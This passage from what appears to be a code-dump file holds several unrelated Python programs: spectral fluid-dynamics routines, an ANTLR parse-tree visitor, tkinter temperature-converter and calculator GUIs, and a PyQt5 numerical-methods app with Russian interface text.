== 0:\n                continue  # kx and ky == 0\n\n            idx = int(np.sqrt(k2) + 0.5)\n            ens_spectrum[idx] += np.abs(S[i, j]) ** 2\n            if idx > max_idx:\n                max_idx = idx\n\n    # The denominator is a normalization constant due to numpy fft\n    return 0.5 * ens_spectrum[:max_idx] / (S.shape[0] * S.shape[1]) ** 2\n\n\ndef calc_Re(vortex_field: np.ndarray, nu: float) -> float:\n    ene_spec = calc_energy_spectrum(vortex_field[:, :])\n    ens_spec = calc_enstrophy_spectrum(vortex_field[:, :])\n    u = np.sqrt(np.sum(ene_spec))  # sqrt of spatial average of kinetic energy\n    l = u / np.sqrt(np.sum(ens_spec))  # integral length scale\n    re = u * l / nu\n    return re\n\n\ndef calc_stream_function(Z: np.ndarray) -> np.ndarray:\n    S = np.fft.fft2(Z)  # spectral data\n    PSI = np.zeros_like(S)\n    for i in range(S.shape[0]):\n        kx = get_wavenumber(i, S.shape[0])\n        for j in range(S.shape[1]):\n            ky = get_wavenumber(j, S.shape[1])\n\n            k2 = np.abs(kx ** 2 + ky ** 2)\n            if k2 == 0:\n                PSI[i, j] = 0.0\n            else:\n                PSI[i, j] = -S[i, j] / k2  # stream function\n\n    return np.real(np.fft.ifft2(PSI))\n\n\ndef calc_velocity(Z: np.ndarray, is_xcomponent: bool) -> np.ndarray:\n    S = np.fft.fft2(Z)  # spectral data\n    V = np.zeros_like(S)\n    for i in range(S.shape[0]):\n        kx = get_wavenumber(i, S.shape[0])\n        for j in range(S.shape[1]):\n            ky = get_wavenumber(j, S.shape[1])\n\n            k2 = np.abs(kx ** 2 + ky ** 2)\n            if k2 == 0:\n                V[i, j] = 0.0\n                continue  # kx and ky == 0\n\n            psi = -S[i, j] / k2  # stream function\n\n            if is_xcomponent:\n                V[i, j] = -(ky * 1j) * psi\n            else:\n                V[i, j] = (kx * 1j) * psi\n    return np.real(np.fft.ifft2(V))\n\n\ndef calc_derivative(G: np.ndarray, is_x: bool) -> np.ndarray:\n    S = np.fft.fft2(G)  # spectral data\n    D = np.zeros_like(S)\n    for i in range(S.shape[0]):\n        kx = get_wavenumber(i, S.shape[0])\n        for j in range(S.shape[1]):\n            ky = get_wavenumber(j, S.shape[1])\n\n            if is_x:\n                D[i, j] = (kx * 1j) * S[i, j]\n            else:\n                D[i, j] = (ky * 1j) * S[i, j]\n    return np.real(np.fft.ifft2(D))\n\n\ndef reflect(Z: np.ndarray) -> np.ndarray:\n    assert len(Z.shape) == 2\n\n    reflected = np.zeros((Z.shape[0], (Z.shape[1] - 1) * 2))\n    reflected[:, : Z.shape[1]] = Z\n    reflected[:, Z.shape[1] :] = -Z[:, ::-1][:, 1:-1]\n\n    return reflected\n\n\ndef calc_velocity_using_sine_transform(Z: np.ndarray, is_xcomponent: bool) -> np.ndarray:\n    reflected = reflect(Z)\n    velocity = calc_velocity(reflected, is_xcomponent)\n    velocity = velocity[:, : Z.shape[1]]\n    assert velocity.shape == Z.shape\n    return velocity\n\n\ndef reflect_velocity(data: np.ndarray, is_u: bool) -> np.ndarray:\n    assert len(data.shape) == 2\n\n    reflected = np.zeros((data.shape[0], (2 * data.shape[1] - 1)))\n    reflected[:, : data.shape[1]] = data\n\n    if is_u:\n        reflected[:, data.shape[1] :] = data[:, ::-1][:, 1:]  # for cosine transform\n    else:\n        reflected[:, data.shape[1] :] = -data[:, ::-1][:, 1:]  # for sine transform\n\n    return reflected\n\n\ndef calc_vorticity_using_sine_cosine_transform(u: np.ndarray, v: np.ndarray) -> np.ndarray:\n    assert u.shape == v.shape\n    assert len(u.shape) == 2\n\n    _u = reflect_velocity(u, is_u=True)\n    _v = reflect_velocity(v, is_u=False)\n    _z = calc_derivative(_v, is_x=True) - calc_derivative(_u, is_x=False)\n    z = _z[:, : u.shape[1]]\n\n    assert z.shape == u.shape\n\n    return z\n\n\ndef calc_vorticity(uv):\n    assert len(uv.shape) == 3\n    assert uv.shape[0] == 2\n    u, v = uv[0, :, :], uv[1, :, :]\n    z = calc_derivative(v, is_x=True) - calc_derivative(u, is_x=False)\n    return z\n\n\ndef calc_energy_spectrum_from_uv_after_scaling(uv: np.ndarray, config: dict) -> np.ndarray:\n    assert len(uv.shape) == 3\n    assert uv.shape[0] == 2\n\n    _uv = uv * config[\"data\"][\"velocity_std\"] + config[\"data\"][\"velocity_mean\"]\n    ene_spec_from_V = calc_energy_spectrum_from_uv(_uv[0], _uv[1])\n\n    return ene_spec_from_V\n\n\ndef calc_energy_spectrum_from_z_after_scaling(z: np.ndarray, config: dict) -> np.ndarray:\n    assert len(z.shape) == 2\n\n    _z = z * config[\"data\"][\"vortex_std\"] + config[\"data\"][\"vortex_mean\"]\n    ene_spec_from_Z = calc_energy_spectrum(_z)\n\n    return ene_spec_from_Z\n\n\ndef calc_enstrophy_spectrum_from_uv_after_scaling(uv: np.ndarray, config: dict) -> np.ndarray:\n    assert len(uv.shape) == 3\n    assert uv.shape[0] == 2\n\n    _uv = uv * config[\"data\"][\"velocity_std\"] + config[\"data\"][\"velocity_mean\"]\n    z = calc_vorticity(_uv)\n    ens_spec = calc_enstrophy_spectrum(z)\n\n    return ens_spec\n\n\ndef calc_enstrophy_spectrum_from_z_after_scaling(z: np.ndarray, config: dict) -> np.ndarray:\n    assert len(z.shape) == 2\n\n    _z = z * config[\"data\"][\"vortex_std\"] + config[\"data\"][\"vortex_mean\"]\n    ens_spec = calc_enstrophy_spectrum(_z)\n\n    return ens_spec\n\n\ndef calc_spectrum_set_from_z_after_scaling(z: np.ndarray, config: dict) -> dict:\n    assert len(z.shape) == 2\n\n    _z = z * config[\"data\"][\"vortex_std\"] + config[\"data\"][\"vortex_mean\"]\n\n    ens_spec = calc_enstrophy_spectrum(_z)\n    ene_spec = calc_energy_spectrum(_z)\n    assert len(ens_spec) == len(ene_spec)\n\n    ks = np.arange(len(ene_spec))\n\n    return {\n        \"energy_spectrum\": ene_spec,\n        \"enstrophy_spectrum\": ens_spec,\n        \"energy_spectrum_xk\": ene_spec * ks,\n        \"enstrophy_spectrum_xk\": ens_spec * ks,\n    }\n\n\ndef calc_spectrum_set_from_uv_after_scaling(uv: np.ndarray, config: dict) -> dict:\n    assert len(uv.shape) == 3\n    assert uv.shape[0] == 2\n\n    _uv = uv * config[\"data\"][\"velocity_std\"] + config[\"data\"][\"velocity_mean\"]\n    z = calc_vorticity(_uv)\n    ens_spec = calc_enstrophy_spectrum(z)\n    ene_spec = calc_energy_spectrum_from_uv(_uv[0], _uv[1])\n\n    assert len(ens_spec) == len(ene_spec)\n\n    ks = np.arange(len(ene_spec))\n\n    return {\n        \"energy_spectrum\": ene_spec,\n        \"enstrophy_spectrum\": ens_spec,\n        \"energy_spectrum_xk\": ene_spec * ks,\n        \"enstrophy_spectrum_xk\": ens_spec * ks,\n    }\n\n\ndef calc_spectrum_set_from_z_after_scaling_using_sine_transform(\n    z: np.ndarray, config: dict\n) -> dict:\n    assert len(z.shape) == 2\n\n    _z = z * config[\"data\"][\"vortex_std\"] + config[\"data\"][\"vortex_mean\"]\n    _z = reflect(_z)\n\n    ens_spec = calc_enstrophy_spectrum(_z) / 4.0\n    ene_spec = calc_energy_spectrum(_z) / 4.0\n    assert len(ens_spec) == len(ene_spec)\n\n    ks = np.arange(len(ene_spec))\n\n    return {\n        \"energy_spectrum\": ene_spec,\n        \"enstrophy_spectrum\": ens_spec,\n        \"energy_spectrum_xk\": ene_spec * ks,\n        \"enstrophy_spectrum_xk\": ens_spec * ks,\n    }\n\n\ndef calc_spectrum_set_from_uv_after_scaling_using_sine_cosine_transform(\n    uv: np.ndarray, config: dict\n) -> dict:\n    assert len(uv.shape) == 3\n    assert uv.shape[0] == 2\n\n    _uv = np.zeros_like(uv)\n\n    _uv[0] = uv[0] * config[\"data\"][\"u_std\"] + config[\"data\"][\"u_mean\"]\n    _uv[1] = uv[1] * config[\"data\"][\"v_std\"] + config[\"data\"][\"v_mean\"]\n    _u = reflect_velocity(_uv[0], is_u=True)\n    _v = reflect_velocity(_uv[1], is_u=False)\n    _uv = np.stack([_u, _v])\n\n    assert len(_uv.shape) == 3\n    assert _uv.shape[0] == 2\n\n    z = calc_vorticity(_uv)\n    ens_spec = calc_enstrophy_spectrum(z) / 4.0\n    ene_spec = calc_energy_spectrum_from_uv(_uv[0], _uv[1]) / 4.0\n\n    assert len(ens_spec) == len(ene_spec)\n\n    ks = np.arange(len(ene_spec))\n\n    return {\n        \"energy_spectrum\": ene_spec,\n        \"enstrophy_spectrum\": ens_spec,\n        \"energy_spectrum_xk\": ene_spec * ks,\n        \"enstrophy_spectrum_xk\": ens_spec * ks,\n    }\n", "398": "# Generated from C:/Users/Alex/PycharmProjects/PersonalProject/src/antlr\\Calc.g4 by ANTLR 4.9.2\nfrom antlr4 import *\nif __name__ is not None and \".\" in __name__:\n    from .CalcParser import CalcParser\nelse:\n    from CalcParser import CalcParser\n\n# This class defines a complete generic visitor for a parse tree produced by CalcParser.\n\nclass CalcVisitor(ParseTreeVisitor):\n\n    # Visit a parse tree produced by CalcParser#parse.\n    def visitParse(self, ctx:CalcParser.ParseContext):\n        return self.visitChildren(ctx)\n\n\n    # Visit a parse tree produced by CalcParser#EquationExpression.\n    def visitEquationExpression(self, ctx:CalcParser.EquationExpressionContext):\n        return self.visitChildren(ctx)\n\n\n    # Visit a parse tree produced by CalcParser#assignment.\n    def visitAssignment(self, ctx:CalcParser.AssignmentContext):\n        return self.visitChildren(ctx)\n\n\n    # Visit a parse tree produced by CalcParser#comment.\n    def visitComment(self, ctx:CalcParser.CommentContext):\n        return self.visitChildren(ctx)\n\n\n    # Visit a parse tree produced by CalcParser#ArithmeticExpressionPow.\n    def visitArithmeticExpressionPow(self, ctx:CalcParser.ArithmeticExpressionPowContext):\n        return self.visitChildren(ctx)\n\n\n    # Visit a parse tree produced by CalcParser#ArithmeticExpressionParens.\n    def visitArithmeticExpressionParens(self, ctx:CalcParser.ArithmeticExpressionParensContext):\n        return self.visitChildren(ctx)\n\n\n    # Visit a parse tree produced by CalcParser#ArithmeticExpressionNumericEntity.\n    def visitArithmeticExpressionNumericEntity(self, ctx:CalcParser.ArithmeticExpressionNumericEntityContext):\n        return self.visitChildren(ctx)\n\n\n    # Visit a parse tree produced by CalcParser#ArithmeticExpressionMultDiv.\n    def visitArithmeticExpressionMultDiv(self, ctx:CalcParser.ArithmeticExpressionMultDivContext):\n        return self.visitChildren(ctx)\n\n\n    # Visit a parse tree produced by CalcParser#ArithmeticExpressionPlusMinus.\n    def visitArithmeticExpressionPlusMinus(self, ctx:CalcParser.ArithmeticExpressionPlusMinusContext):\n        return self.visitChildren(ctx)\n\n\n    # Visit a parse tree produced by CalcParser#NumericConst.\n    def visitNumericConst(self, ctx:CalcParser.NumericConstContext):\n        return self.visitChildren(ctx)\n\n\n    # Visit a parse tree produced by CalcParser#NumericVariable.\n    def visitNumericVariable(self, ctx:CalcParser.NumericVariableContext):\n        return self.visitChildren(ctx)\n\n\n\ndel CalcParser", "399": "from tkinter import *\nfrom functools import partial  # To prevent unwanted windows\n\n\nclass Converter:\n    def __init__(self):\n\n        # formatting variables\n        background_colour = \"light blue\"\n\n        # Initialise list to hold calculation history\n        # In later versions list will be populated with user calculations\n        self.all_calc_list = [\"0 degrees F is -17.8 degrees C\",\n                              \"0 degrees C is 32 degrees F\",\n                              \"100 degrees F is 37.8 degrees C\"]\n\n        # Converter Main Screen GUI\n        self.converter_frame = Frame(width=300, height=300,\n                                     bg=background_colour, pady=10)\n        self.converter_frame.grid()\n\n        # Temperature Conversion Heading (row 0)\n        self.temp_converter_label = Label(self.converter_frame,\n                                          text=\"Temperature Converter\",\n                                          font=(\"Arial\", \"16\", \"bold\"),\n                                          bg=background_colour,\n                                          padx=10, pady=10)\n        self.temp_converter_label.grid(row=0)\n\n        # history Button (row 1)\n        self.history_button = Button(self.converter_frame, text=\"History\",\n                                  font=(\"Arial\", \"14\"), padx=10, pady=10,\n                                  command=lambda: self.history(self.all_calc_list))\n        self.history_button.grid(row=1)\n\n    def history(self, calc_history):\n        History(self, calc_history)\n\nclass History:\n    def __init__(self, partner, calc_history):\n        background = \"#f5e7b5\"  # beige\n\n        # disable history button\n        partner.history_button.config(state=DISABLED)\n\n        # sets up child window (ie. history box)\n        self.history_box = Toplevel()\n\n        # if users press cross at top, closes history and 'releases' history button\n        self.history_box.protocol('WM_DELETE_WINDOW', partial(self.close_history,\n                                                           partner))\n\n        # set up GUI frame\n        self.history_frame = Frame(self.history_box, width=300, bg=background)\n        self.history_frame.grid()\n\n        # set up history heading (row 0)\n        self.hist_heading = Label(self.history_frame, text=\"Calculate History\",\n                                  font=\"Arial 18 bold\", bg=background)\n        self.hist_heading.grid(row=0)\n\n        # history text (label, row 1)\n        self.history_text = Label(self.history_frame,\n                                  text=\"Here are your most recent \"\n                                       \"calculations. Please use the export \"\n                                       \"button to create a text file of all \"\n                                       \"your calculations for this session\",\n                                  font=\"Arial 10 italic\", wrap=250,\n                                  justify=LEFT, width=40, bg=background,\n                                  padx=10, pady=10)\n        self.history_text.grid(row=1)\n\n        # History output goes here (row 2)\n        history_string = \"\"\n        if len(calc_history) >= 7:\n            for item in range(0, 7):\n                history_string += calc_history[len(calc_history)-item-1]+\"\\n\"\n\n        else:\n            for item in calc_history:\n                history_string += calc_history[len(calc_history) -\n                                               calc_history.index(item)-1]+\"\\n\"\n                self.history_text.config(text=\"Here is your calculation \"\n                                              \"history. You can use the \"\n                                              \"export button to save this \"\n                                              \"data to a text file if desired\")\n        # Label to display calculation history to user\n        self.calc_label = Label(self.history_frame, text=history_string,\n                                bg=background, font=\"Arial 12\", justify=LEFT)\n        self.calc_label.grid(row=2)\n\n        # Export / Dismiss button frame\n        self.export_dismiss_frame = Frame(self.history_frame)\n        self.export_dismiss_frame.grid(row=3, pady=10)\n\n        # Export Button\n        self.export_btn = Button(self.export_dismiss_frame, text=\"Export\",\n                                 font=\"Arial 12 bold\")\n        self.export_btn.grid(row=0, column=0)\n\n        # Dismiss Button\n        self.dismiss_btn = Button(self.export_dismiss_frame, text=\"Dismiss\",\n                                 font=\"Arial 12 bold\",\n                                 command=partial(self.close_history, partner))\n        self.dismiss_btn.grid(row=0, column=1)\n\n    def close_history(self, partner):\n        # Put history button back to normal...\n        partner.history_button.config(state=NORMAL)\n        self.history_box.destroy()\n\n\n# main routine\nif __name__ == \"__main__\":\n    root = Tk()\n    root.title(\"Temperature Converter\")\n    something = Converter()\n    root.mainloop()\n", "400": "from PyQt5 import uic\nfrom PyQt5.QtWidgets import QApplication\nfrom PyQt5.QtGui import QPixmap\nimport calculations as calc\nimport math\n\nForm, Window = uic.loadUiType(\"MainWindow.ui\")\nForm1, Window1 = uic.loadUiType(\"Task1Window.ui\")\nForm2, Window2 = uic.loadUiType(\"Task2Window.ui\")\nForm3, Window3 = uic.loadUiType(\"Task3Window.ui\")\nForm3_2, Window3_2 = uic.loadUiType(\"Task3_2Window.ui\")\nForm4, Window4 = uic.loadUiType(\"Task4Window.ui\")\n\napp = QApplication([])\nwindow = Window()\nform = Form()\nform.setupUi(window)\nwindow.show()\n\nwindow1 = Window1()\nform1 = Form1()\nform1.setupUi(window1)\n\nwindow2 = Window2()\nform2 = Form2()\nform2.setupUi(window2)\n\nwindow3 = Window3()\nform3 = Form3()\nform3.setupUi(window3)\n\nwindow3_2 = Window3_2()\nform3_2 = Form3_2()\nform3_2.setupUi(window3_2)\n\nwindow4 = Window4()\nform4 = Form4()\nform4.setupUi(window4)\n\n\ndef open_Task1():\n    window.close()\n    window1.show()\n\n\ndef open_Task2():\n    window.close()\n    window2.show()\n\n\ndef open_Task3():\n    window.close()\n    window3.show()\n\n\ndef open_Task3_2():\n    window3.close()\n    window3_2.show()\n\n\ndef open_Task3_1():\n    window3_2.close()\n    window3.show()\n\n\ndef open_Task4():\n    window.close()\n    window4.show()\n\n\ndef task1_calc():\n    u_method = form1.comboBMethod.currentText()\n    u_algorithm = form1.comboBAlgorithm.currentText()\n    u_n = form1.spinN.value()\n    a = 0.5\n    b = 1.3\n    e = 10**(-6)\n    res = 0\n    if u_algorithm == '\u0421 \u043f\u043e\u0441\u0442\u043e\u044f\u043d\u043d\u044b\u043c \u0448\u0430\u0433\u043e\u043c':\n        if u_method == '\u041c\u0435\u0442\u043e\u0434 \u043b\u0435\u0432\u044b\u0445 \u043f\u0440\u044f\u043c\u043e\u0443\u0433\u043e\u043b\u044c\u043d\u0438\u043a\u043e\u0432':\n            res = calc.LH_rect_method_CONST_h(a, b, u_n)\n        elif u_method == '\u041c\u0435\u0442\u043e\u0434 \u043f\u0440\u0430\u0432\u044b\u0445 \u043f\u0440\u044f\u043c\u043e\u0443\u0433\u043e\u043b\u044c\u043d\u0438\u043a\u043e\u0432':\n            res = calc.RH_rect_method(a, b, u_n)\n        elif u_method == '\u041c\u0435\u0442\u043e\u0434 \u0442\u0440\u0430\u043f\u0435\u0446\u0438\u0439':\n            res = calc.trapezoid_method(a, b, u_n)\n        elif u_method == '\u041c\u0435\u0442\u043e\u0434 \u043f\u0430\u0440\u0430\u0431\u043e\u043b':\n            res = calc.parabola_method(a, b, u_n)\n        else:\n            res = '\u0412\u0432\u0435\u0434\u0451\u043d \u043d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434'\n    elif u_algorithm == '\u0421 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u043c \u0448\u0430\u0433\u043e\u043c':\n        if u_method == '\u041c\u0435\u0442\u043e\u0434 \u043b\u0435\u0432\u044b\u0445 \u043f\u0440\u044f\u043c\u043e\u0443\u0433\u043e\u043b\u044c\u043d\u0438\u043a\u043e\u0432':\n            res = calc.rect_method_remainder(a, b, u_n, e)\n        else:\n            res = '\u0410\u043b\u0433\u043e\u0440\u0438\u0442\u043c \u0441 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u043c \u0448\u0430\u0433\u043e\u043c \\n\u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d \u0442\u043e\u043b\u044c\u043a\u043e \u043f\u043e \u043c\u0435\u0442\u043e\u0434\u0443 \\n\u043b\u0435\u0432\u044b\u0445 \u043f\u0440\u044f\u043c\u043e\u0443\u0433\u043e\u043b\u044c\u043d\u0438\u043a\u043e\u0432'\n    else:\n        res = '\u0412\u0432\u0435\u0434\u0451\u043d \u043d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0430\u043b\u0433\u043e\u0440\u0438\u0442\u043c'\n\n    form1.lOutputRes.setText(f'{res}')\n\n\ndef task2_calc():\n    u_nx = form2.sbn_x.value()\n    u_ny = form2.sbn_y.value()\n    a = 0\n    c = 0\n    b = math.pi / 2\n    d = math.pi / 2\n    hx = calc.step_calc(a, b, u_nx)\n    hy = calc.step_calc(c, d, u_ny)\n    form2.dsh_x.setValue(hx)\n    form2.dsh_y.setValue(hy)\n    form2.lResult.setText(f'{calc.mult_integrals(a, b, c, d, hx, hy)}')\n\n\ndef task3_eps_calc():\n    a = []\n    a.append(form3.DSA0_eps.value())\n    a.append(form3.DSA1_eps.value())\n    a.append(form3.DSA2_eps.value())\n    a.append(form3.DSA3_eps.value())\n    a.append(form3.DSA4_eps.value())\n    a.append(form3.DSA5_eps.value())\n    a.append(form3.DSA6_eps.value())\n    a.append(form3.DSA7_eps.value())\n    e = int(form3.eps_coef_eps.text()) * 10**int(form3.power_of_ten_eps.text())\n    x = form3.DSX_eps.value()\n    form3.lResult_eps.setText(f'{calc.calc_eps_func(a, e, x)}')\n\n\ndef task3_sin_calc():\n    a = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n    a[1] = form3.DSA1_sin.value()\n    a[3] = form3.DSA3_sin.value()\n    a[5] = form3.DSA5_sin.value()\n    a[7] = form3.DSA7_sin.value()\n    a[9] = form3.DSA9_sin.value()\n    e = int(form3.eps_coef.text()) * 10**int(form3.power_of_ten_sin.text())\n    x = int(form3.pi_coef.text()) * math.pi / int(form3.inverse_pi_coef.text())\n    form3.lResult_sin.setText(f'{calc.calc_sin_func(a, e, x)}')\n\n\ndef task3_2_calc():\n    e = int(form3_2.eps_coef.text()) * 10**int(form3_2.power_of_ten.text())\n    x = form3_2.DSX.value()\n    y0 = form3_2.DSY.value()\n    form3_2.lResult.setText(f'{calc.iteration_1(x, y0, e)}')\n\n\ndef task3_2_calc_2():\n    e = float(form3_2.eps_coef_2.text()) * 10**int(\n        form3_2.power_of_ten_2.text())\n    x = float(form3_2.DSX_2.value())\n    y0 = float(form3_2.DSY_2.value())\n    form3_2.lResult_2.setText(f'{calc.iteration_2(x, y0, e)}')\n\n\ndef task4_calc():\n    ex = form4.CBExample.currentText()\n    method = form4.CBMethod.currentText()\n    e = int(form4.eps_coef.text()) * 10**int(form4.power_of_ten.text())\n    if ex == \"\u0418\u043d\u0434\u0438\u0432\u0438\u0434\u0443\u0430\u043b\u044c\u043d\u044b\u0439 \u043f\u0440\u0438\u043c\u0435\u0440\":\n        a = form4.dsh_a.value() * math.pi\n        b = form4.dsh_b.value() * math.pi\n        if method == \"\u041c\u0435\u0442\u043e\u0434 \u043a\u0430\u0441\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0445\":\n            form4.lResult.setText(f\"{calc.newtons_method_ind(a, b, e)}\")\n        elif method == \"\u0414\u0435\u043b\u0435\u043d\u0438\u0435 \u043e\u0442\u0440\u0435\u0437\u043a\u0430 \u043f\u043e\u043f\u043e\u043b\u0430\u043c\":\n            form4.lResult.setText(f\"{calc.separation_ind(a, b, e)}\")\n        elif method == \"\u041e\u0442\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u043a\u043e\u0440\u043d\u0435\u0439 \u0443\u0440\u0430\u0432\u043d\u0435\u043d\u0438\u044f\":\n            form4.lResult.setText(f\"{calc.division_ind(a, b, e)}\")\n        else:\n            form4.lResult.setText(f\"{calc.chord_ind(a, b, e)}\")\n    elif ex == \"\u041a\u043e\u043d\u0442\u0440\u043e\u043b\u044c\u043d\u044b\u0439 \u043f\u0440\u0438\u043c\u0435\u0440\":\n        a = form4.dsh_a.value()\n        b = form4.dsh_b.value()\n        if method == \"\u041c\u0435\u0442\u043e\u0434 \u043a\u0430\u0441\u0430\u0442\u0435\u043b\u044c\u043d\u044b\u0445\":\n            form4.lResult.setText(f\"{calc.newtons_method_ctrl(a, b, e)}\")\n        elif method == \"\u0414\u0435\u043b\u0435\u043d\u0438\u0435 \u043e\u0442\u0440\u0435\u0437\u043a\u0430 \u043f\u043e\u043f\u043e\u043b\u0430\u043c\":\n            form4.lResult.setText(f\"{calc.division_ctrl(a, b, e)}\")\n        elif method == \"\u041e\u0442\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u043a\u043e\u0440\u043d\u0435\u0439 \u0443\u0440\u0430\u0432\u043d\u0435\u043d\u0438\u044f\":\n            form4.lResult.setText(f\"{calc.separation_ctrl(a, b, e)}\")\n        else:\n            form4.lResult.setText(f\"{calc.chord_ctrl(a, b, e)}\")\n\n\ndef return_from_Task1():\n    window1.close()\n    window.show()\n\n\ndef return_from_Task2():\n    window2.close()\n    window.show()\n\n\ndef return_from_Task3():\n    window3.close()\n    window.show()\n\n\ndef return_from_Task3_2():\n    window3_2.close()\n    window.show()\n\n\ndef return_from_Task4():\n    window4.close()\n    window.show()\n\n\ndef show_Example():\n    if form4.CBExample.currentText() == \"\u041a\u043e\u043d\u0442\u0440\u043e\u043b\u044c\u043d\u044b\u0439 \u043f\u0440\u0438\u043c\u0435\u0440\":\n        form4.label.setPixmap(QPixmap(\"ctrlTask4.png\"))\n        form4.pi_a.setText(\"\")\n        form4.pi_b.setText(\"\")\n        form4.dsh_a.setValue(0.5)\n        form4.dsh_b.setValue(1)\n    elif form4.CBExample.currentText() == \"\u0418\u043d\u0434\u0438\u0432\u0438\u0434\u0443\u0430\u043b\u044c\u043d\u044b\u0439 \u043f\u0440\u0438\u043c\u0435\u0440\":\n        form4.label.setPixmap(QPixmap(\"individTask4.png\"))\n        form4.pi_a.setText(\"* \u03c0\")\n        form4.pi_b.setText(\"* \u03c0\")\n        form4.dsh_a.setValue(-2)\n        form4.dsh_b.setValue(2)\n    else:\n        form4.label.setPixmap(QPixmap(\"\"))\n        form4.pi_a.setText(\"\")\n        form4.pi_b.setText(\"\")\n        form4.dsh_a.setValue(0)\n        form4.dsh_b.setValue(0)\n\n\nform.TaskButton1.clicked.connect(open_Task1)\nform.TaskButton2.clicked.connect(open_Task2)\nform.TaskButton3.clicked.connect(open_Task3)\nform.TaskButton4.clicked.connect(open_Task4)\n\nform1.bCalculation.clicked.connect(task1_calc)\nform1.bReturn.clicked.connect(return_from_Task1)\n\nform2.bCalculation.clicked.connect(task2_calc)\nform2.bReturn.clicked.connect(return_from_Task2)\n\nform3.bCalculation_eps.clicked.connect(task3_eps_calc)\nform3.bCalculation_sin.clicked.connect(task3_sin_calc)\nform3.bReturn.clicked.connect(return_from_Task3)\nform3.bPart2.clicked.connect(open_Task3_2)\n\nform3_2.bCalculation.clicked.connect(task3_2_calc)\nform3_2.bCalculation_2.clicked.connect(task3_2_calc_2)\nform3_2.bReturn.clicked.connect(return_from_Task3_2)\nform3_2.bPart1.clicked.connect(open_Task3_1)\n\nform4.CBExample.activated.connect(show_Example)\nform4.bCalculation.clicked.connect(task4_calc)\nform4.bReturn.clicked.connect(return_from_Task4)\napp.exec_()\n", "401": "from tkinter import *\nfrom tkinter import messagebox\nfrom tkinter import ttk\n\nroot = Tk()\nroot.title('\u041a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440')  \nrav = False\nmemory = \"\"\n#\u043b\u043e\u0433\u0438\u043a\u0430 \u043a\u0430\u043b\u044c\u043a\u0443\u043b\u044f\u0442\u043e\u0440\u0430\ndef calc(key):\n    str2 = \"0123456789\"\n    if key == \"=\":\n#\u0438\u0441\u043a\u043b\u044e\u0447\u0430\u0435\u043c \u043d\u0430\u043f\u0438\u0441\u0430\u043d\u0438\u0435 \u0431\u0443\u043a\u0432\n        str1 = \"-+01234567789.*/\"\n        if calc_entry.get()[0] not in str1:\n            calc_entry.delete(0, END)\n            calc_entry.insert(END, \"\u041f\u0435\u0440\u0432\u044b\u0439 \u0441\u0438\u043c\u0432\u043e\u043b \u043d\u0435 \u0447\u0438\u0441\u043b\u043e!\")\n            messagebox.showerror(\"\u041e\u0448\u0438\u0431\u043a\u0430!\", \"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043d\u0435 \u0447\u0438\u0441\u043b\u043e!\")\n#\u0441\u0447\u0451\u0442\n        try:\n            result = eval(calc_entry.get())\n            calc_entry.delete(0, END)\n            if (result % 1 == 0):\n                result = round(result)\n            calc_entry.insert(END, str(result))\n            global rav\n            rav = True\n        except:\n            calc_entry.delete(0, END)\n            calc_entry.insert(END, \"\u041e\u0448\u0438\u0431\u043a\u0430!\")\n            messagebox.showerror(\"\u041e\u0448\u0438\u0431\u043a\u0430!\",\"\u041f\u0440\u043e\u0432\u0435\u0440\u044c \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u043d\u0430\u043f\u0438\u0441\u0430\u043d\u0438\u044f!\")\n#\u043e\u0447\u0438\u0441\u0442\u0438\u0442\u044c \u043f\u043e\u043b\u0435\n    elif key == \"C\":\n        calc_entry.delete(0, END)\n#\u0443\u0434\u0430\u043b\u0438\u0442\u044c \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0438\u0439 \u0441\u0438\u043c\u0432\u043e\u043b\n    elif key == \"del\":\n        calc_entry.delete(len(calc_entry.get())-1, END) \n#\u043f\u0430\u043c\u044f\u0442\u044c\n    elif key == \"M\":\n        global memory\n        str1 = \"-+01234567789.*/\" \n        if calc_entry.get()[0] not in str1:\n            calc_entry.delete(0, END)\n            calc_entry.insert(END, \"\u041f\u0435\u0440\u0432\u044b\u0439 \u0441\u0438\u043c\u0432\u043e\u043b \u043d\u0435 \u0447\u0438\u0441\u043b\u043e!\")\n            messagebox.showerror(\"\u041e\u0448\u0438\u0431\u043a\u0430!\", \"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043d\u0435 \u0447\u0438\u0441\u043b\u043e!\")\n#\u0441\u0447\u0451\u0442\n        try:\n            temp = eval(calc_entry.get())\n            if (temp % 1 == 0):\n                temp = round(temp) \n            memory = str(temp)[:10]\n        except:\n            calc_entry.delete(0, END)\n            calc_entry.insert(END, \"\u041e\u0448\u0438\u0431\u043a\u0430!\")\n            messagebox.showerror(\"\u041e\u0448\u0438\u0431\u043a\u0430!\",\"\u041f\u0440\u043e\u0432\u0435\u0440\u044c \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u043d\u0430\u043f\u0438\u0441\u0430\u043d\u0438\u044f!\")\n        memory_label.config(text = \"M: \" + memory)\n    elif key == \"M+\":\n        if memory != \"0\":\n            calc_entry.insert(END,\"+\" + memory)    \n    elif key == \"M-\":\n        if memory != \"0\":\n            calc_entry.insert(END,\"-\" + memory) \n    elif key == \"MC\":\n        memory = \"0\"\n        memory_label.config(text = \"M: \" + memory) \n#\u0441\u043c\u0435\u043d\u0430 +/-\n    elif key == \"-/+\":\n        if \"=\" in calc_entry.get():\n            calc_entry.delete(0, END)\n        try:\n            if calc_entry.get()[0] == \"-\":\n                calc_entry.delete(0)\n            else:\n                calc_entry.insert(0, \"-\")\n        except IndexError:\n            pass\n    elif key == \"-\" or key == \"/\" or key == \"*\" or key == \"+\":\n        if calc_entry.get()[len(calc_entry.get())-1] in str2:\n                calc_entry.insert(END, key)\n                rav = False\n    elif key == \".\":\n        x1 = 